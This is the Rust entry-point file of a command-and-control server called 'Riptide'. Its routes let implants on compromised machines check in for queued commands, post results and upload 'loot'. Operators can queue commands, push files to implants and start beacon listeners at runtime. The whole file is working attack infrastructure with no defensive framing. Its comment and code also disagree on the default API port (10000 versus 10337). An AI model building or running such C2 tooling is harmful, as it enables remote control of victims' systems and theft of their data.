// Riptide C2 server — interactive command & control.
//
// The server always listens on --api-port (default 10000) for operator API + WebSocket.
// Beacon listeners (HTTP/HTTPS) are started and stopped dynamically at runtime
// via the API or console TUI — no restart needed.
//
// Routes:
//   IMPLANT-FACING (on dynamic listeners):
//     GET/POST /beacon    → log beacon, return queued commands
//     POST     /upload    → save loot / store results
//     POST     /result    → submit command results
//   OPERATOR-FACING (on api-port):
//     GET    /health                       → health check
//     GET    /api/v1/sessions              → list sessions
//     GET    /api/v1/sessions/:id          → session detail
//     DELETE /api/v1/sessions/:id          → remove session
//     POST   /api/v1/sessions/:id/commands → queue command
//     GET    /api/v1/sessions/:id/commands → command history
//     GET    /api/v1/sessions/:id/commands/:cid → command detail
//     DELETE /api/v1/sessions/:id/commands/:cid → cancel command
//     POST   /api/v1/sessions/:id/files    → upload file to implant
//     GET    /api/v1/listeners             → list active listeners
//     POST   /api/v1/listeners             → start a listener
//     DELETE /api/v1/listeners/:port       → stop a listener
//     GET    /ws/events                    → WebSocket event stream
//
// Usage:
//   riptide-server                          # API on :10000, no beacon listeners
//   riptide-server --api-port 8443          # API on custom port

mod models;
mod routes;
mod state;
mod util;

use clap::Parser;
use std::fs;
use std::net::SocketAddr;
use std::path::PathBuf;
use std::sync::Arc;

use state::AppState;

// ── CLI ────────────────────────────────────────────────────────────

#[derive(Parser)]
#[command(name = "riptide-server")]
struct Cli {
    /// Port for the operator API + WebSocket (no beacon listeners at startup)
    #[arg(long, default_value = "10337")]
    api_port: u16,

    /// Bind address
    #[arg(long, default_value = "0.0.0.0")]
    host: String,

    /// Directory for TLS certificates (used by dynamic HTTPS listeners)
    #[arg(long, default_value = ".")]
    cert_dir: PathBuf,

    /// Beacon log file
    #[arg(long, default_value = "/var/log/riptide/beacons.log")]
    beacon_log: PathBuf,

    /// Loot file
    #[arg(long, default_value = "/var/log/riptide/loot.bin")]
    loot_file: PathBuf,

    /// Combined log file
    #[arg(long, default_value = "/var/log/riptide/all.log")]
    all_log: PathBuf,
}

// ── Cert generation ─────────────────────────────────────────────────

fn ensure_cert(cert_dir: &PathBuf) -> (PathBuf, PathBuf) {
    let cert_path = cert_dir.join("cert.pem");
    let key_path = cert_dir.join("key.pem");
    if cert_path.exists() && key_path.exists() {
        return (cert_path, key_path);
    }
    let alt_names = vec!["localhost".to_string(), "riptide-server".to_string()];
    let cert = rcgen::generate_simple_self_signed(alt_names).expect("cert gen");
    fs::write(&cert_path, cert.serialize_pem().expect("serialize cert")).expect("write cert.pem");
    fs::write(&key_path, cert.serialize_private_key_pem()).expect("write key.pem");
    println!("[+] Generated TLS cert: {:?} / {:?}", cert_path, key_path);
    (cert_path, key_path)
}

// ── App builder ─────────────────────────────────────────────────────

fn build_api_router(state: Arc<AppState>) -> axum::Router {
    let api_routes = axum::Router::new()
        .route("/sessions", axum::routing::get(routes::api::list_sessions))
        .route("/sessions/:id", axum::routing::get(routes::api::get_session).delete(routes::api::delete_session))
        .route("/sessions/:id/commands", axum::routing::get(routes::api::list_commands).post(routes::api::queue_command))
        .route("/sessions/:id/commands/:cid", axum::routing::get(routes::api::get_command).delete(routes::api::cancel_command))
        .route("/sessions/:id/files", axum::routing::get(routes::api::list_files).post(routes::api::upload_file_to_implant))
        .route("/listeners", axum::routing::get(routes::api::list_listeners).post(routes::api::start_listener))
        .route("/listeners/:port", axum::routing::delete(routes::api::stop_listener));

    let ws_routes = axum::Router::new()
        .route("/events", axum::routing::get(routes::ws::ws_handler));

    axum::Router::new()
        .nest("/api/v1", api_routes)
        .nest("/ws", ws_routes)
        .route("/health", axum::routing::get(routes::api::health))
        .with_state(state)
}

// ── Main ───────────────────────────────────────────────────────────

#[tokio::main]
async fn main() {
    let _ = rustls::crypto::aws_lc_rs::default_provider().install_default();

    let cli = Cli::parse();

    // Ensure log directories exist
    for path in &[&cli.beacon_log, &cli.loot_file, &cli.all_log] {
        if let Some(p) = path.parent() {
            let _ = fs::create_dir_all(p);
        }
    }

    // Pre-generate TLS cert (used by dynamic HTTPS listeners)
    let (cert_path, key_path) = ensure_cert(&cli.cert_dir);

    let state = Arc::new(AppState::new(
        cli.beacon_log.clone(),
        cli.loot_file.clone(),
        cli.all_log.clone(),
        cert_path,
        key_path,
    ));

    let api_addr: SocketAddr = format!("{}:{}", cli.host, cli.api_port).parse().expect("api addr");

    println!("╔══════════════════════════════════════════════════╗");
    println!("║   Riptide C2 Server                             ║");
    println!("╠══════════════════════════════════════════════════╣");
    println!("║  API + WS   → http://{}", api_addr);
    println!("║  Beacon log → {}", cli.beacon_log.display());
    println!("║  Loot file  → {}", cli.loot_file.display());
    println!("║  All log    → {}", cli.all_log.display());
    println!("╠══════════════════════════════════════════════════╣");
    println!("║  No beacon listeners at startup.                ║");
    println!("║  Start them via API or console:                 ║");
    println!("║    curl -X POST .../api/v1/listeners \\          ║");
    println!("║      -d '{{\"port\":8080,\"protocol\":\"http\"}}'   ║");
    println!("╚══════════════════════════════════════════════════╝");
    println!();

    util::log_line(&state.all_log, "RIPTIDE_SERVER_START");

    // Start the admin API listener
    let api_app = build_api_router(state.clone());
    let api_listener = tokio::net::TcpListener::bind(api_addr).await.expect("bind api port");
    println!("[+] API listener on http://{}", api_addr);

    axum::serve(api_listener, api_app.into_make_service_with_connect_info::<SocketAddr>())
        .await
        .expect("api serve");
}
